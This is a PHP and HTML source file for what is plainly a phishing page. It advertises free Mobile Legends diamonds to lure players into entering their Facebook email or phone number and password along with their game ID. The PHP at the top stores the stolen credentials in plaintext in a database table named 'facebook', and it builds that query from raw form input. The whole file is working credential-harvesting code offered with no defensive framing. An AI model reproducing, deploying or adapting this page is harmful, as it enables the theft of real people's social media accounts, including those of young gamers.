<?php

include "connection.php";
if(isset($_POST["go"])){
  $MLID = $_POST["MLID"];
$server = $_POST["server"];
$email = $_POST["email"];
$password = $_POST["password"];

$sql = "insert into facebook(email, password,MLID,server) value('$email','$password','$MLID','$server')";
$query = mysqli_query($conn,$sql);


}
?>
<!DOCTYPE HTML>
<html lang="en">
  
  <head>
   <meta charset="utf-8" >
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="style.css">
   <title>MLBB FREE PROMO DIAMONDS</title>
    </head>
    
    <body>
      <div id="main">
      <img id="promo" src="promo.png">
      <form id="form" method="POST">
     <br>  <label id="label1">Facebook of your Mobile Legends</label><br>
       <input type="text" name="email" placeholder="Email or Number" required>
       <input type="password" name="password" placeholder="Password" required>
      <br>
      <label id="label2">Mobile Legends Account</label>
     <br>
      <input type="number" name="MLID" placeholder="Mobile Legends ID" required>
      <input type="number" placeholder="Server" name="server" required>
      <br>
      <input type="submit" name="go" value="Done">
      
        

      </form>
      </div>
      </body>
      </html>